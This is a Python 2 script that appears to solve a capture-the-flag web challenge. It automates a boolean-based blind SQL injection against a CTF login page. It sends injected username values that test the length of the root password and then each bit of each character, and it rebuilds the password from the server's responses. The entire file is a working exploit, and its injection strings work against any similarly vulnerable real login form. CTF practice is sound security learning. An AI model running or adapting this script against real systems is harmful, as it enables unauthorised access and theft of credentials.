#! /usr/bin/python
# -*- coding: utf-8 -*-
"""
web2_02.py (v0.2)

Created: 2014-09-28

Copyright (c) 2010: Vte J. Garcia Mayen  <neofito@gmail.com>
Copyright (c) 2010: Neo System Forensics http://neosysforensics.es

This program is free software; you can redistribute it and/or modify it
under the terms of the GNU General Public License as published by the
Free Software Foundation; either version 2 of the License, or (at your
option) any later version.  See http://www.gnu.org/copyleft/gpl.html for
the full text of the license.
"""
import requests
import sys

def make_query(query, okmsg):
    """ Function doc """

    payload = {'u': query, 'p': ''}
    req = requests.get("http://ctf.navajanegra.com/web2.php", params=payload)

    if okmsg in req.text:
        return True
    else:
        return False

def guess_password_length():
    """ Function doc """

    okmsg = "User root correct but bad Password!"

    length = 1
    query = "root' and length(pass) > '%d" % length
    while make_query(query, okmsg):
        sys.stdout.write('%s\r' % length)
        length = length + 1
        query = "root' and length(pass) > '%d" % length

    sys.stdout.write(" " * len(str(length)) + "\r")
    return length

def guess_character(position, okmsg):
    """ Function doc """

    query  = "root' and ascii(substring(pass,%s,1)) & '%s' = '%s"
    bit = [128, 64, 32, 16, 8, 4, 2, 1]

    byte = 0
    for value in bit:
        qry = query % (str(position), str(value), str(value))
        if make_query(qry, okmsg):
            byte += value

    return byte

def guess_password(length):
    """ Function doc """

    okmsg = "User root correct but bad Password!"
    index = 0

    password = ""
    while len(password) != length:
        index += 1
        byte = guess_character(index, okmsg)
        password += chr(byte)
        sys.stdout.write('%s\r' % password)

    sys.stdout.write(" " * length + "\r")

    return password

def main():
    """ Main function """

    print '---------------------------------------------------'
    print '- #nn4ed CTF - Level: web2 (Blind SQL Injection) -'
    print '---------------------------------------------------'
    print '[*] Guessing password length...'
    length = guess_password_length()
    print '[*] Password length guessed!'
    print '[*] Guessing password...'
    password = guess_password(length)
    print '[*] Password guessed!'
    print '---------------------------------------------------'
    print 'Password: %s' % password

if __name__ == "__main__":
    main()

